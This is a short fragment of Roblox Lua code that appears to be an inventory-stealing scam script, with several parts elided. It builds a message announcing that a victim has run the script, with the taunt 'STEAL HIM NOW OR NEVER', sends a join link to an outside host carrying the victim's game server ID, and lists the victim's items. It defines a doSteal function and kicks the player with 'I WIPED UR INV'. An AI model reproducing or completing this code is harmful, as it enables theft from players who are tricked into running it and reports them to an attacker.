...
local function SendJoinMessage(list, prefix)
    local fields = {
        ...
        {
            name = "Join link:",
            value = "codephantomjoiner.netlify.app/joiner?placeId=126884695634066&gameInstanceId=" .. game.JobId
        },
        {
            name = "Item list:",
            value = "",
    ...
    local data = {
        ...
        ["embeds"] = {{
            ["title"] = "\240\159\140\180 NEW DUMBO EXECUTED UR SCRIPT STEAL HIM NOW OR NEVER",
            ["color"] = 255,
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = "YO NEW HIT"
...
if #itemsToSend > 0 then
    ...
    local function doSteal(player)
        ...
        plr:kick("I WIPED UR INV I AM DASH SCRIPTS")
    end
